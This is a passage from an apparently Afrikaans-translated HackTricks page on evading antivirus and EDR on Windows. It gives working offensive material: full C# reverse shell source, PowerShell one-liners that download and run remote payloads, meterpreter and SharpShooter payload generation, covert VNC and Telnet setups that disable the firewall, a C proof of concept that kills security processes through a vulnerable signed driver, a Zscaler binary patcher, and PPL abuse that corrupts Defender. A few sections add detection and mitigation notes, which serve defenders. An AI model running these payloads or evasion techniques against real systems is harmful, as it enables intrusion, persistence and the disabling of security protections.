Die repo dui aan: Defender scan steeds die skripte, maar deur Go, Java, PHP ens. te gebruik het ons **meer buigbaarheid om statiese signatures te omseil**. Toetse met ewekansige on-geobfuskate reverse shell skripte in hierdie tale het sukses getoon.

## TokenStomping

Token stomping is 'n tegniek wat 'n aanvaller toelaat om die toegangstoken of 'n sekuriteitsproduk soos 'n EDR of AV te **manipuleer**, sodat hulle die privilegies kan verminder; die proses sal nie sterf nie, maar sal nie die permisies hê om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **verhoed dat eksterne prosesse** handvatsels oor die tokens van sekuriteitsprosesse kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n slagoffer se rekenaar te ontplooi en dit te gebruik om dit oor te neem en persistensie te behou:
1. Download vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Run die installer stil in die slagoffer (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop bladsy en klik next. Die wizard sal jou dan vra om te authorize; klik die Authorize knoppie om voort te gaan.
4. Execute die gegewe parameter met 'n paar aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin parameter wat toelaat om die pin te stel sonder om die GUI te gebruik).

## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetrie in een stelsel in ag neem, so dit is praktisch onmoontlik om volkome onopgemerk te bly in volwasse omgewings.

Elke omgewing wat jy teëkom sal sy eie sterktes en swakhede hê.

Ek moedig jou sterk aan om hierdie talk van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk, om 'n voete in meer Advanced Evasion tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hier is ook nog 'n baie goeie talk van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binary **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou en dit aan jou uiteensit.\
Nog 'n hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot en met Windows10 het alle Windows weergawes 'n **Telnet server** meegebring wat jy as administrateur kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel begin en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet port** (stealth) en skakel firewall af:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin downloads hê, nie die setup nie)

**ON THE HOST**: Execute _**winvnc.exe**_ en konfigureer die server:

- Skakel die opsie _Disable TrayIcon_ in
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Skuif dan die binêre _**winvnc.exe**_ en die **nuut geskepte** lêer _**UltraVNC.ini**_ na die **victim**

#### **Reverse connection**

Die **attacker** moet op sy **host** die binêre `vncviewer.exe -listen 5900` uitvoer, sodat dit gereed is om 'n omgekeerde **VNC connection** op te vang. Dan, op die **victim**: Begin die winvnc-demon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om stealth te behou, moet jy nie die volgende doen nie

- Moet nie `winvnc` begin as dit reeds loop nie of jy sal 'n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. Kontroleer of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` sonder `UltraVNC.ini` in dieselfde gids begin nie, anders sal dit [die config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige Defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# wat die compiler gebruik
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir 'n voorbeeld om injectors te bou:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR vanaf kernruimte uitskakel

Storm-2603 het 'n klein konsole-hulpmiddel genaamd **Antivirus Terminator** benut om endpoint-beskerming uit te skakel voordat ransomware neergelaai is. Die instrument bring sy **eie kwesbare maar *ondertekende* driver** en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Key take-aways
1. **Signed driver**: Die lêer wat na skyf afgelewer is, is `ServiceMouse.sys`, maar die binêr is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs’ “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste lyn registreer die driver as 'n **kernel service** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik word.
3. IOCTLs blootgestel deur die driver
| IOCTL code | Bekwaamheid                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beeïndig 'n ewekansige proses per PID (gebruik om Defender/EDR-dienste te beëindig) |
| `0x990000D0` | Verwyder 'n ewekansige lêer op skyf |
| `0x990001D0` | Ontlaai die driver en verwyder die diens |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD slaan gebruikersmodus-beskerming heeltemal oor; kode wat in die kernel uitgevoer word, kan *protected* prosesse oopmaak, hulle beëindig, of met kernel-objekte knoei ongeag PPL/PP, ELAM of ander verhardingsfunksies.

Detection / Mitigation
•  Aktiveer Microsoft se bloklys vir kwesbare drivers (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.  
•  Moniteer die skep van nuwe *kernel* dienste en waarsku wanneer 'n driver vanaf 'n gids wat vir alle gebruikers skryfbaar is gelaai word of nie op die allow-list voorkom nie.  
•  Let op gebruikersmodus-handvatsels na pasgemaakte toestelobjekte wat gevolg word deur verdagte `DeviceIoControl`-oproepe.

### Omseiling van Zscaler Client Connector se Posture Checks deur On-Disk Binary Patching

Zscaler se **Client Connector** pas toestel-houdingsreëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak 'n volledige omseiling moontlik:

1. Posture-evaluasie gebeur **heeltemal kliëntkantig** (n boolean word na die bediener gestuur).
2. Interne RPC-endpunte valideer slegs dat die verbindende uitvoerbare lêer **signed by Zscaler** is (via `WinVerifyTrust`).

Deur vier ondertekende binêre lêers op skyf te patch, kan beide meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug sodat elke kontrole as voldoenend beskou word |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige (selfs ongehandtekende) proses kan aan die RPC-pype bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tunnel | Kortgesluit |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Alle** postuurkontroles wys **groen/kompatibel**.
* Ongetekende of gemodifiseerde binaries kan die named-pipe RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleid.

Hierdie gevallestudie demonstreer hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-wysigings omseil kan word.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) handhaaf 'n ondertekenaar/vlak-hiërargie sodat slegs beskermde prosesse met gelyke of hoër vlakke mekaar kan manipuleer. Aanvallend gesproke, as jy 'n wettige PPL-geaktiveerde binary kan begin en sy argumente beheer, kan jy onskuldige funksionaliteit (bv. logging) omskep in 'n beperkte, PPL-ondersteunde skryf-primitive teenoor beskermde gidse wat deur AV/EDR gebruik word.

Wat veroorsaak dat 'n proses as PPL loop
- Die teiken EXE (en enige gelaaide DLLs) moet geteken wees met 'n PPL-geskikte EKU.
- Die proses moet geskep word met CreateProcess met die vlae: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- 'n Verenigbare beskermingsvlak moet versoek word wat ooreenstem met die ondertekenaar van die binary (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal by skepping misluk.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Gebruikspatroon:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN-primitief: ClipUp.exe
- Die gesigneerde stelsel-binarie `C:\Windows\System32\ClipUp.exe` maak 'n nuwe proses van homself en aanvaar 'n parameter om 'n loglêer na 'n deur die roeper-gespesifiseerde pad te skryf.
- Wanneer dit as 'n PPL-proses begin word, vind die lêerskryf plaas met PPL-ondersteuning.
- ClipUp kan nie paadjies met spasies ontleed nie; gebruik 8.3 kortpaadjies om na normaalweg beskermde plekke te wys.

8.3 kortpaadjie-hulpmiddels
- Lys kortname: `dir /x` in elke ouermap.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Begin die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad-argument om 'n lêerskepping in 'n beskermde AV-gids te dwing (bv. Defender Platform). Gebruik 8.3 kortname indien nodig.
3) As die teiken-binarie normaalweg deur die AV oop/gesluit is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryf by opstart voordat die AV begin deur 'n auto-start service te installeer wat betroubaar vroeër loop. Valideer die opstartvolgorde met Process Monitor (boot logging).
4) By heropstart vind die PPL-ondersteunde skryf plaas voordat die AV sy binarieë sluit, wat die teikenlêer korrupteer en die opstart verhoed.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Jy kan nie die inhoud wat `ClipUp` skryf beheer nie, behalwe vir die plasing; die primitief is meer geskik vir korrupsie as vir presiese inhoudsinspuiting.
- Vereis plaaslike admin/SYSTEM om 'n diens te installeer/te begin en 'n herlaai-venster.
- Tydsberekening is kritiek: die teiken mag nie oop wees nie; uitvoering tydens opstart vermy lêerlocke.

Detections
- Proses-skepping van `ClipUp.exe` met ongewone argumente, veral waar die ouerproses 'n nie-standaard opstarter is, rondom opstart.
- Nuwe dienste wat gekonfigureer is om verdagte binaries outomaties te begin en wat konsekwent voor Defender/AV begin. Ondersoek diens-skepping/modifikasie wat voor Defender se opstartfoute plaasgevind het.
- Lêer-integriteitsmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/modifikasies deur prosesse met protected-process flags.
- ETW/EDR telemetrie: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale PPL-vlak gebruik deur nie-AV binaries.

Mitigations
- WDAC/Code Integrity: beperk watter gesigneerde binaries as PPL mag hardloop en onder watter ouerprosesse; blokkeer ClipUp-aanroep buite geldige kontekste.
- Diens-higiëne: beperk skepping/modifikasie van outo-start dienste en monitor manipulasie van opstartvolgorde.
- Verseker dat Defender tamper protection en early-launch protections geaktiveer is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg om 8.3 short-name generering op volumes wat security tooling huisves te deaktiveer indien dit versoenbaar is met jou omgewing (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
